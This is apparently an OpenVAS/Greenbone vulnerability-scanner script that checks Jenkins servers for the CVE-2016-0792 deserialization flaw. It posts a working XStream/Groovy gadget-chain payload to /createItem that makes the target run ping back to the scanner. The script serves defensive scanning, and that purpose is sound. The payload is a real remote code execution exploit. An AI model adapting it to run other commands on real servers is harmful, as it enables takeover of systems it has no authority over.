# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:jenkins:jenkins";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107230");
  script_version("2022-12-13T10:10:56+0000");
  script_cve_id("CVE-2016-0792");
  script_name("Jenkins Deserialization Vulnerability - CVE-2016-0792");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2022-12-13 10:10:56 +0000 (Tue, 13 Dec 2022)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-01-05 02:30:00 +0000 (Fri, 05 Jan 2018)");
  script_tag(name:"creation_date", value:"2017-08-10 12:09:09 +0200 (Thu, 10 Aug 2017)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_jenkins_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("jenkins/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42394/");
  script_xref(name:"URL", value:"https://github.com/jpiechowka/jenkins-cve-2016-0792/");
  script_xref(name:"URL", value:"https://jenkins.io/security/advisory/2016-02-24/");

  script_tag(name:"summary", value:"Jenkins is prone to a Java deserialization vulnerability.");

  script_tag(name:"vuldetect", value:"Send a serialized object which execute a ping against the scanner.");

  script_tag(name:"insight", value:"Multiple unspecified API endpoints in Jenkins allow remote authenticated users
  to execute arbitrary code via serialized data in an XML file, related to XStream and groovy.util.Expando.");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute arbitrary code
  in the context of the affected application.");

  script_tag(name:"affected", value:"All Jenkins main line releases up to and including 1.649, All Jenkins LTS
  releases up to and including 1.642.1.");

  script_tag(name:"solution", value:"Jenkins main line users should update to 1.650, Jenkins LTS users should
  update to 1.642.2.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service: "www" ) )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

vtstrings = get_vt_strings();
check = vtstrings["ping_string"];
pattern = hexstr( check );

if( os_host_runs("Windows") == "yes" ) {
  cmd = '<command><string>ping</string><string>-n</string><string>5</string><string>'+ this_host() + '</string></command>';
  win = TRUE;
} else {
  cmd = '<command><string>ping</string><string>-c</string><string>5</string><string>-p</string><string>' + pattern + '</string><string>'+ this_host() + '</string></command>';
}

data =
'        <map>
          <entry>
            <groovy.util.Expando>
              <expandoProperties>
                <entry>
                  <string>hashCode</string>
                  <org.codehaus.groovy.runtime.MethodClosure>
                    <delegate class="groovy.util.Expando"/>
                    <owner class="java.lang.ProcessBuilder">
                      ' + cmd + '
                    </owner>
                    <method>start</method>
                  </org.codehaus.groovy.runtime.MethodClosure>
                </entry>
              </expandoProperties>
            </groovy.util.Expando>
            <int>1</int>
          </entry>
        </map>';

url = '/createItem?name=' + rand_str( length:8 );

req = http_post_put_req( port:port,
                         url:url,
                         data:data,
                         add_headers:make_array( "Content-Type", "application/xml" ) );

res = send_capture( socket:soc,
                    data:req,
                    timeout:5,
                    pcap_filter:string( "icmp and icmp[0] = 8 and dst host ", this_host(), " and src host ", get_host_ip() ) );

close( soc );

if( res && ( win || check >< res ) ) {
  report = 'By sending a special crafted serialized java object it was possible to execute `' + cmd  + '` on the remote host\nReceived answer:\n\n' + res ;
  security_message( port:port, data:report );
}

exit( 0 );
